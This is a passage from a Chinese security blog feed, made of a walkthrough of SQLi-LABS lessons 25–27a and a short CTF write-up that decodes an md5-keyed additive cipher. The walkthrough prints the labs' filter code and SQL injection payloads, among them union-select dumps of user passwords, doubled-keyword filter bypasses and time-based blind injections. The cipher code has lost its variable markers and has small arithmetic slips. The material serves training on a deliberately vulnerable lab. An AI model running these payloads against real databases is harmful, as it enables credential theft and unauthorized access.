by</code>包含了<code>or</code>所以给过滤了。</p><ul><li>我们可以使用双重<code>or</code>进行绕过。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 注意<span class="comment">-- 后面的空格。</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 -- </span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211025224638599.png" alt="image-20211025224638599"></p></li></ul></li><li><p>根据目前得到的数据我们可以推断出该SQL语句为：</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 form <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>接下来我们需要获取所有的数据（查询该数据库中的所有表和所有列这里就不进行演示了）。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users) --</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211025225050527.png" alt="image-20211025225050527"></p><h2 id="Less-25a-用OR-amp-AND欺骗"><a href="#Less-25a-用OR-amp-AND欺骗" class="headerlink" title="Less-25a 用OR&amp;AND欺骗"></a>Less-25a 用OR&amp;AND欺骗</h2><ul><li>根据页面提示在链接添加一个属性和值：id&#x3D;1。正常返回数据。</li><li>判断该SQL语句的类型。<ul><li>使用在id值后面添加单引号，返回页面数据为空，可以推断出该SQL语句类型为数值。</li></ul></li><li>接下来我们直接获取所有的数据，这里和Less-25区别不大（查询该数据库中的所有表和所有列这里就不进行演示了）。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),(<span class="keyword">select</span> group_concat(passwoorrd) <span class="keyword">from</span> users) <span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20211025225928644.png" alt="image-20211025225928644"></p><h2 id="Less-26-Trick-with-comments"><a href="#Less-26-Trick-with-comments" class="headerlink" title="Less-26 Trick with comments"></a>Less-26 Trick with comments</h2><ul><li>判断该数据SQL语句的类型经过尝试。发现该SQL语句类型为字符串类型。</li><li>经过多次尝试以后发现该SQL语句有进行过滤处理，这时候我们就需要查看源代码。</li><li>发现了过滤函数。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    <span class="comment"># 下面的代码都是在过滤空格</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out spaces</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                <span class="comment">//Strip out slashes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>因为这里过滤空格和注释。我没有办法进行报错注入，这里只能用布尔和时间延迟方法进行注入。</p><ul><li>这里我使用时间延迟方法进行注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 为什么要用aandnd，因为preg_replace()函数不会进行多次过滤</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;aandnd(if(substring(user(),1,1)=char(114),sleep(3),0))=&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>剩下的步骤我这里就不进行详细说明。你可以去查看Less-10的步骤。</li></ul></li></ul><h2 id="Less-26a-Trick-with-comments"><a href="#Less-26a-Trick-with-comments" class="headerlink" title="Less-26a Trick with comments"></a>Less-26a Trick with comments</h2><ul><li>查看源代码后发现Less-26a和Less-26区别不大只是在SQL语句添加了<code>()</code>。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">26</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"># <span class="number">26</span>a</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>我们只需要修改一下Less-26的payload就可以了。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)aandnd(if(substring(user(),1,1)=char(114),sleep(3),0))=(&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-27与SELECT-amp-UNION的绕过"><a href="#Less-27与SELECT-amp-UNION的绕过" class="headerlink" title="Less-27与SELECT&amp;UNION的绕过"></a>Less-27与SELECT&amp;UNION的绕过</h2><ul><li>这题和Less-26区别不大只是在过滤函数添加了更多过滤规则。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Less-26</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out spaces</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                <span class="comment">//Strip out slashes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Less-27</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>我们只需要把Less-26的payload修改即可。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(if(substring(user(),1,1)=char(114),sleep(3),0))=&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-27a与SELECT-amp-UNION的绕过"><a href="#Less-27a与SELECT-amp-UNION的绕过" class="headerlink" title="Less-27a与SELECT&amp;UNION的绕过"></a>Less-27a与SELECT&amp;UNION的绕过</h2><ul><li>Less-27a和Less-27两个题目的区别在于SQL语句不一样。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Less-27</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment"># Less-27a</span></span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> .<span class="variable">$id</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>Less-27使用单引号，Less-27a使用双引号。</li><li>这里我们只需要把Less-27的payload修改即可。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot;and(if(substring(user(),1,1)=char(114),sleep(3),0))=&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Less-1-基于错误的字符串&quot;&gt;&lt;a href=&quot;#Less-1-基于错误的字符串&quot; class=&quot;headerlink&quot; title=&quot;Less-1  基于错误的字符串&quot;&gt;&lt;/a&gt;Less-1  基于错误的字符串&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;首先找到注入点，打开</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web33 WriteUp</title>
    <link href="http://webb-l.top/2021/05/26/CTF/Web32%20WriteUp/"/>
    <id>http://webb-l.top/2021/05/26/CTF/Web32%20WriteUp/</id>
    <published>2021-05-25T16:00:00.000Z</published>
    <updated>2022-04-02T10:55:08.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/../../images/Web32%20WriteUp/index.png" alt="index.png"></p><h3 id="加密代码："><a href="#加密代码：" class="headerlink" title="加密代码："></a>加密代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">data,key</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     key = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);x = <span class="number">0</span>;</span><br><span class="line">     len = <span class="title function_ invoke__">strlen</span>(data);</span><br><span class="line">     klen = <span class="title function_ invoke__">strlen</span>(key);</span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>;i &lt; len;i++) &#123; </span><br><span class="line">         <span class="keyword">if</span> (x ==klen)</span><br><span class="line">        &#123;</span><br><span class="line">            x = <span class="number">0</span>;</span><br><span class="line">        &#125;char .= key[x];</span><br><span class="line">        x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;str .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(data[i]) + <span class="title function_ invoke__">ord</span>(char[i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>$key = md5(&#39;ISCC&#39;);</code> 这里的key&#x3D;729623334f0aa2784a1599fd374c120d。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i &lt; len;i++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (x ==klen)</span><br><span class="line">     &#123;</span><br><span class="line">         x = <span class="number">0</span>;</span><br><span class="line">     &#125;char .= key[x];</span><br><span class="line">     x+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// 根据用户传入的data长度执行循环，并且根据x的值在key提取字符串给$char。</span></span><br></pre></td></tr></table></figure><ul><li>上面的代码都不是重点。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">    str .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(data[i]) + <span class="title function_ invoke__">ord</span>(char[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">&#125; <span class="comment">// 这里的for循环和上方的for循环一模一样，主要需要我们解密的代码在18行。</span></span><br></pre></td></tr></table></figure><ul><li>根据i为索引在data中提取出一个字符然后转换为int型，在加上char中提取出来的int型数据余上128，然后再将得出来的结果转换成char类型并拼接到str中。</li></ul><p><strong>例如：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>=<span class="number">97</span>, <span class="string">&#x27;7&#x27;</span>=<span class="number">55</span></span><br><span class="line"><span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;7&#x27;</span>)) % <span class="number">128</span>)</span><br><span class="line"><span class="title function_ invoke__">chr</span>((<span class="number">97</span> + <span class="number">55</span>) % <span class="number">128</span>)</span><br><span class="line"><span class="title function_ invoke__">chr</span>((<span class="number">97</span> + <span class="number">55</span>) % <span class="number">128</span>)</span><br><span class="line"><span class="title function_ invoke__">chr</span>((<span class="number">97</span> + <span class="number">55</span>) % <span class="number">128</span>)</span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">152</span>%<span class="number">128</span>)</span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">24</span>)</span><br><span class="line"><span class="number">24</span>=<span class="string">&#x27;取消&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>为什么要余上128?<ul><li>答：因为ascii表一共只有128个，如果超出去无法让int型转化成char型。</li></ul></li><li><code>20| return base64_encode($str);</code> 将循环结束后的结果进行base64编码并返回给用户。</li></ul><h3 id="解密代码："><a href="#解密代码：" class="headerlink" title="解密代码："></a>解密代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">decrypt</span>(<span class="string">&quot;GA==&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;data = <span class="title function_ invoke__">base64_decode</span>(data);key = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">     x = <span class="number">0</span>;len = <span class="title function_ invoke__">strlen</span>(data);klen = <span class="title function_ invoke__">strlen</span>(key);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == klen) &#123;x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        char .=key[x];x += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        result = <span class="title function_ invoke__">ord</span>(data[i]) - <span class="title function_ invoke__">ord</span>(char[i]);</span><br><span class="line">           <span class="keyword">if</span> (result &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">           str .= <span class="title function_ invoke__">chr</span>(result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           str .= <span class="title function_ invoke__">chr</span>(result + <span class="number">128</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str = <span class="subst">$str</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>5| data = base64_decode(data);</code> 先把base64加密的数据进行解密，解密出来的int型数据为24，char类型数据为’取消’。</li><li><code>6| $key = md5(&#39;ISCC&#39;);</code> 这里和加解密的key都是一样的。key&#x3D;729623334f0aa2784a1599fd374c120d</li><li>其他的代码都是和加密代码一致。</li><li>重点在这里。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]);</span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$result</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$result</span> + <span class="number">128</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第20行用data[i]-char[i]&#x3D;原来的数，如果&gt;&#x3D;0那么就可以直接输出字符，如果&lt;&#x3D;0的话在ASCII表中是不存在所有我们需要加上128。</p><p>data[i]&#x3D;’取消’&#x3D;24，char[i]&#x3D;’7’&#x3D;55。</p><p>第21行判断result是否大于等于0，如果大于等于零就跳转到第22行，如果不是就跳转到第24行。</p><p>第22行将result变量的值转换成char型并字符串拼接到str中。</p><p>第24行将result变量值小于0的值+128变成ASCII表中存在的数值，并将int型的数据转换成char型数据并把字符串拼接到str中。</p><p>这里的result&#x3D;-31很明显它是要跳转到第24行。</p><p>结果：-32+128&#x3D;97&#x3D;‘a’</p></blockquote><ul><li>把GA替换成题目中的描述就可以得到flag。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/../../images/Web32%20WriteUp/index.png&quot; alt=&quot;index.png&quot;&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="CTF,Web33,WriteUp" scheme="http://webb-l.top/tags/CTF-Web33-WriteUp/"/>
    
  </entry>
  
</feed>
